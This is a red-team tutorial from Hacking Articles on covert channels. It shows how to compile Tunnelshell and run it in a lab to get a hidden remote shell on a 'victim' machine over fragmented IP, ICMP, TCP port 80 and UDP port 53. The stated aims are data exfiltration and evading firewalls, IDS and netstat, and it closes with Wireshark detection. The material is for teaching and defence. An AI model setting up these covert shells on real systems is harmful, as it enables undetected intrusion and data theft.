<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/exfiltration/" rel="category tag">Exfiltration</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Covert Channel: The Hidden Network</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/covert-channel-the-hidden-network/" rel="bookmark"><time class="entry-date published" datetime="2019-04-21T15:02:14+00:00">April 21, 2019</time><time class="updated" datetime="2025-07-26T07:53:46+00:00">July 26, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Generally, the hacker uses a hidden network to escape from a firewall and IDS. In this post, you will learn how to steal information from the target machine through an undetectable network. Such type of network is known as a covert channel, which seems as generic traffic to any network monitor device/application and network admin. It could be considered as steganography, but it is not exactly steganography. Two endpoint users can use the covert channel for undetectable communication from the network administrator.</span></p>
<p><span style="color: #000000;">The red teamers use covert channels for data exfiltration in red teaming operations through a legitimate network and the data exfiltration is a process of secretly sharing data between two endpoints.</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Table of Content</span> </span></h3>
<p><strong><span style="color: #000000;">What is a Covert channel</span></strong></p>
<ul>
<li><span style="color: #000000;">Type of covert channel</span></li>
</ul>
<p><strong><span style="color: #000000;">Covert channel attack using TunnelShell</span></strong></p>
<ul>
<li><span style="color: #000000;">What is Tunnelshell</span></li>
<li><span style="color: #000000;">Covert ICMP Channel</span></li>
<li><span style="color: #000000;">Covert HTTP Channel</span></li>
<li><span style="color: #000000;">Covert DNS Channel</span></li>
</ul>
<h3><span style="color: #800000;"><strong>What is the covert channel?</strong></span></h3>
<p><span style="color: #000000;">The word covert means “hidden or undetectable,” and Channel is “communication mode”, hence a covert channel denotes an undetectable network of communication. This makes the transmission virtually undetectable by administrators or users through a secret channel. It’s very essential to know the difference between encrypted communication and covert communication. In covert communication, the data stream is garbled and lasting by an unauthorized party. However, encrypted communications do not hide the fact that there has been a communication by encrypted the data travelling between both endpoints.</span></p>
<h5><span style="color: #000000;"><strong>Type of covert channel </strong></span></h5>
<p><span style="color: #000000;"><strong>Storage covert Channel:</strong> Communicate by modifying a “storage location”, which would allow the direct or indirect writing of a storage location by one process and the direct or indirect reading of it by another.</span></p>
<p><span style="color: #000000;"><strong>Timing Covert channels</strong> – Perform operations that affect the “real response time observed” by the receiver.</span></p>
<p><span style="color: #000000;"><em>Note: The well – known Spectre and Meltdown use a system’s page cache as their covert channel for exfiltrating data. </em></span></p>
<p><span style="color: #000000;"><em>The specter and Meltdown attacks work by tricking your computer into caching privileged memory and, through miscalculated speculative execution, a lack of privilege checking in out-of-order execution, and the power of the page cache. Once privileged memory is accessed, the processor caches the information and retrieves it from the cache, regardless of whether it’s privileged information or not.</em></span></p>
<p><span style="color: #000000;"><em>Read the complete article from <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="//medium.com/@danielabloom/covert-channels-demystified-4b1f406a76e3">here</a></span></strong>.</em></span></p>
<h3><span style="color: #800000;">Covert Channel Attack Using Tunnelshell</span></h3>
<p><span style="color: #000000;">It is possible to use almost any protocol to make a covert channel. The huge majority of covert channel research has been based on layer 3 (Network) and layer 4 (Transport) protocols such as  ICMP, IP and TCP. Layer 7 (Application) protocols such as HTTP and DNS are also frequently used. This mechanism for conveying the information without alerting network firewalls and IDSs and moreover undetectable by netstat.</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">What is tunnelshell?</span> </span></h3>
<p><span style="color: #000000;">Developers wrote Tunnelshell in C for Linux users, and it operates with a client-server paradigm. The server opens a /bin/sh that clients can access through a virtual tunnel. It works over multiple protocols, including TCP, UDP, ICMP, and RawIP, will work. Moreover, attackers can fragment packets to evade firewalls and IDS.</span></p>
<p><span style="color: #000000;">Let’s go with practical for more details.</span></p>
<h5><span style="color: #000000;"><strong>Requirement</strong></span></h5>
<ul>
<li><span style="color: #000000;">Server (Kali Linux)</span></li>
<li><span style="color: #000000;">Client (Ubuntu 18.04)</span></li>
<li><span style="color: #000000;">Tool for Covert Channel (Tunnelshell), which you can download from <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://packetstorm.news/files/id/32231" class="broken_link">here</a></span></strong>.</span></li>
</ul>
<p><span style="color: #000000;">Here, I’m assuming we already have a victim’s machine session through the C2 server. Now we need to create a hidden communication channel for data exfiltration; therefore, install TunnelShell on both endpoints.</span></p>
<p><span style="color: #000000;">Once you download it, then extract the file and compile it as shown below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">tar xvfz tunnelshell_2.3.tgz
make</pre>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-7grENft-Sf0/XLyC_tQoA2I/AAAAAAAAeFE/_tKy7NqgOKsStGo1FIzoeYxzqkS0q8z6ACLcBGAs/s1600/2.png" alt="Covert Channel Hidden Network" width="931" height="483"/></span></p>
<p><span style="color: #000000;">Similarly, repeat the same at the other endpoint (victim’s machine) and after completion, execute the following command in the terminal to open communication channel for the server (Attacker).</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo ./tunneld</pre>
<p><span style="color: #000000;">By default, it sends fragment packet, which reassembles at the destination to evade from firewall and IDS.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-9BkBFqwUj9w/XLyC_7lOZiI/AAAAAAAAeFI/uThqO84pdf0IXltGFOklnMwPu70S5EVEgCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Now to connect with tunnelshell, we need to execute the following command on the server (Attacker’s machine) which will establish a covert channel for data exfiltration.</span></p>
<p><span style="color: #000000;"><em>Syntax: ./tunnel -i &lt;session id (0-65535)&gt; -d &lt;delay in sending packets&gt; -s &lt;packet size&gt; -t &lt;tunnel type&gt; -o &lt;protocol&gt; -p &lt;port&gt; -m &lt;ICMP query&gt; -a &lt;ppp interface&gt; &lt;Victim’s IP&gt;</em></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./tunnel -t frag 10.10.10.2</pre>
<h5><span style="color: #000000;"><strong>frag:</strong> </span></h5>
<p><span style="color: #000000;">It uses IPv4 fragmented packets to encapsulate data.  When some routers and firewalls (like Cisco routers and default Linux installation) receives fragmented packets without headers for the fourth layer, they permit pass it even if they have a rule that denies it. As you can observe that it is successfully connected to 10.10.10.2 and we are to access the shell of the victim’s machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//2.bp.blogspot.com/-htTq5d1FvfE/XLyDAWKFjNI/AAAAAAAAeFM/eVuvQHrGwxccQoP1xompouzZeW8HlxWRACLcBGAs/s1600/5.png" alt="Covert Channel Hidden Network" width="669" height="229"/></span></p>
<p><span style="color: #000000;">As I had said, if you check the network statistics using netstat, then you will not observe any process ID for tunnelshell. From the below image, you can observe that with the help of the <strong>ps </strong>command, I checked in process for tunnelshell and then tried to check its process ID through <strong>netstat</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ps |grep .tunneld
netstat –ano</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="//1.bp.blogspot.com/-ue4ylrl4WMQ/XLyDAudZVHI/AAAAAAAAeFQ/CbY27MHFM3Emlt1LQe_GgZixMnNrfsAiwCLcBGAs/s1600/6.1.png"/></strong></span></p>
<p><span style="color: #000000;">Let’s take a look at network traffic generated between 10.10.10.1 (Attacker’s IP) and 10. 10.10.2 (Victim’s IP) using Wireshark. The network flow looks generic between both endpoints, but if it is monitored properly, then a network administrator could sniff the data packet. As you can observe that Wireshark has captured the covert traffic and sniffed the data that was traveling between two endpoint devices.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//4.bp.blogspot.com/-EA9qHUfJJpI/XLyDBBGQ3fI/AAAAAAAAeFU/5gtKFT4gTpk27dCYPTF3N9Jnb7xOmL5XQCLcBGAs/s1600/6.png" alt="Covert Channel Hidden Network" width="1043" height="405"/></span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Covert ICMP Channel</span> </span></h3>
<p><span style="color: #000000;">As we know, Ping is the use of ICMP communication that uses ICMP echo request and ICMP echo reply queries to establish a connection between two hosts. Therefore, execute the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo ./tunneld -t icmp -m echo-reply, echo</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-q44FTY4Y8LE/XLyDBbFR2jI/AAAAAAAAeFc/2bDLOJ8NK08dqWe8tg74uZJm5-_C3lrBQCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now, to connect with tunnelshell, we need to execute the following command on the server (Attacker’s machine). This will establish a covert channel for data exfiltration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./tunnel -t icmp -m echo-reply,echo 10.10.10.2</pre>
<p><span style="color: #000000;">As you can observe that it is successfully connected to 10.10.10.2 and the attacker is able to access the shell of the victim’s machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-hoq0ybplQKE/XLyDBAjUhLI/AAAAAAAAeFY/1dxeb0DxPzQdYFqDN4bp6PqgHHFYYw8OwCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Again, if you capture the traffic through Wireshark. Then you will notice the ICMP echo request and reply packet are being transmitted between both endpoints. And if you try to analyze these packets, then you will be able to see what kind of payload is traveling as ICMP data.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-f7DWsSm_GZ8/XLyDB4ra8nI/AAAAAAAAeFg/zgIltYvaYYMVFcMILcwVhDJZIveUtJisQCLcBGAs/s1600/9.png" alt="Covert Channel Hidden Network" width="1022" height="412"/></span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Covert HTTP Channel</span> </span></h3>
<p><span style="color: #000000;">It establishes a virtual TCP connection without using three-way handshakes. It doesn’t bind any port, so you can use a port already used by another process. Therefore, execute the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo  ./tunneld -t tcp -p 80,2000</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-8NbKx1k6Q7w/XLyC95LxDNI/AAAAAAAAeEw/MEEPmJRuq_UG_eoHMS0H7G2RM2aS-I8-gCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now to connect with tunnelshell, we need to execute the following command on the server (Attacker’s machine). It will establish a covert channel for data exfiltration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./tunnel -t tcp -p 80,2000 10.10.10.2</pre>
<p><span style="color: #000000;">You can observe that the connection to 10.10.10.2 was successful. The attacker is again able to access the shell of the victim’s machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-qv2kDHWOBOk/XLyC9_7ivaI/AAAAAAAAeEs/ph3QdXd0el8baNJExKoxyL49xDtmLuz1wCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">On the other side, if you consider the network traffic. Then, you will notice a TCP communication established without a three-way handshake between the source and destination.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-eNAd_FJoGyE/XLyC-MorgvI/AAAAAAAAeE0/PV0oy9XVAVEp6lEB6cdEQiffJ8CEW322ACLcBGAs/s1600/12.png" alt="Covert Channel Hidden Network" width="743" height="379"/></span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Covert DNS Channel </span> </span></h3>
<p><span style="color: #000000;">To establish DNS covert channel, we need to run UDP tunnel mode on both endpoint machines. Therefore, execute the following command on the victim’s machine:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo ./tunneld -t udp -p 53,2000</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-4ua_NQk6K54/XLyC-5OtGVI/AAAAAAAAeE4/cQDZ85UTo_Q7KPgZa0DgnU3kgtUJ-pQHwCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Similarly, execute the following on your (Attacker) machine to connect with a tunnel.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./tunnel -t udp -p 53,2000 10.10.10.2</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-SSDMmnU1SG0/XLyC_POiwII/AAAAAAAAeE8/BidFUVXjm7cJGOoUloYr7VPYNrTDU6ctQCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">You can observe that the system successfully connected to 10.10.10.2, and the attacker accessed the shell of the victim’s machine.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-U8ewdFxbE0A/XLyC_ap2KcI/AAAAAAAAeFA/kQY8rSYCXHcFFwiQboH6JVSSCd5v8g8AgCLcBGAs/s1600/15.png" alt="Covert Channel Hidden Network" width="970" height="419"/></span></p>
<p><span style="color: #000000;"><strong>Conclusion</strong>: Covert channel does not transmit encrypted data packets during data exfiltration. Therefore, sniffers can easily detect it, and the network admin can effectively manage data loss and risk.</span></p>
<p><span style="color: #000000;">To learn more about Exfiltration Techniques. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/red-teaming/exfiltration/">Link.</a></strong></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles, an Information Security Consultant, Social Media Lover, and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
